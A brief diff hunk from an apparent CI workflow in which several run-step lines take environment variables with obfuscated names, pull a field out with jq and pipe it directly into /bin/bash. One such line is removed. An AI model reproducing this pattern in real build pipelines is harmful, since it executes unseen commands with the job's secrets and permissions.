@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$ax796" | jq -r .fc81 | /bin/bash
           printf '%s' "$bkzr0958" | jq -r .flwor66498 | /bin/bash
-          echo $sl3488 | jq -r .wj23 | /bin/bash
           printf '%s' "$utahj59145" | jq -r .c24270 | /bin/bash
 
       - name: Archive output
